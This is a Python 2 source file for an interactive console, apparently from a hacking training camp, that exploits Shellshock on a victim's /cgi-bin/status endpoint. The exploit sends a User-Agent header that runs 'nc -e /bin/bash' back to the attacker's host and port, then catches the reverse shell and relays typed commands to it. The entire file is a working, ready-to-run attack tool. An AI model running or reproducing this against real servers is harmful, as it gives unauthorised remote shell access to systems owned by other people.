import socket
import threading
import requests
import cmd


class ListenerThread(threading.Thread):
    def __init__(self, host, port):
        threading.Thread.__init__(self)
        self.host = host
        self.port = port
        self.result = None
        self.connection = None

    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (self.host, self.port)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(server_address)
        s.listen(5)
        self.connection, client_address = s.accept()

    def execute(self, command):
        try:
            self.connection.send(command+"\n")
            print self.connection.recv(1024)
        except AttributeError:
            print "Connection error. Please check parameters.."

    def close(self):
        self.connection.close()


class ExploitThread(threading.Thread):
    def __init__(self, victim_host, host, port):
        threading.Thread.__init__(self)
        self.host = host
        self.port = port
        self.victim_host = victim_host

    def run(self):
        requests.get('http://' + self.victim_host + '/cgi-bin/status',
                     headers={"User-Agent": "() { :;}; /usr/bin/nc " + self.host + " " + self.port + " -e /bin/bash"})


class Console(cmd.Cmd):
    def __init__(self):
        cmd.Cmd.__init__(self)
        self.prompt = "$hackercamp> "
        self.params = {}
        self.worker_listener = None

    def do_set(self, line):
        key, value = line.split()
        self.params[key] = value

    def do_show(self, line):
        if line == 'options':
            for key, value in self.params.items():
                print '[!] {} = {}'.format(key, value)
        else:
            print '[!] not found'

    def do_exploit(self, line):
        self.worker_listener = ListenerThread(self.params['lhost'], int(self.params['lport']))
        self.worker_listener.start()
        self.worker_exploit = ExploitThread(self.params['rhost'], self.params['lhost'], self.params['lport'])
        self.worker_exploit.start()
        print "[+] Exploit successfully :)"

    def do_run(self, line):
        self.worker_listener.execute(line)

    def do_exit(self, line):
        self.worker_listener.close()
        return True

    def do_EOF(self, line):
        print
        self.do_exit(line)
        return True

    def do_quit(self, line):
        self.do_exit(line)
        return True

    def emptyline(self):
        pass


if __name__ == "__main__":
    console = Console()
    console.cmdloop()
